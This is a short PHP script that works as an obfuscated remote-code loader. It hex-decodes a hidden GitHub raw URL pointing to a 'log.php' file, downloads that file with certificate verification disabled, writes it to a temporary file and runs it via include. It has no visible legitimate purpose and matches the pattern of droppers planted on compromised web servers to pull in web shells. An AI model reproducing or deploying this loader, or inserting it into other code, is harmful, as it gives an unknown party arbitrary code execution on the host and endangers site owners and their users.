<?php
$h = '0x68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f417279613133332f5048502f726566732f68656164732f6d61696e2f6c6f672e706870';

$f = function ($x) {
    $s = '';
    for ($i = 0; $i < strlen($x) - 1; $i += 2) {
        $s .= chr(hexdec($x[$i] . $x[$i + 1]));
    }
    return $s;
};

$u = $f($h);

$d = @file_get_contents($u);
if (!$d && function_exists('curl_init')) {
    $c = curl_init($u);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
    $d = curl_exec($c);
    curl_close($c);
}

if ($d) {
    $r = tmpfile();
    fwrite($r, $d);
    fseek($r, 0);
    include stream_get_meta_data($r)['uri'];
    fclose($r);
} else {
    echo "Download gagal.";
}
?>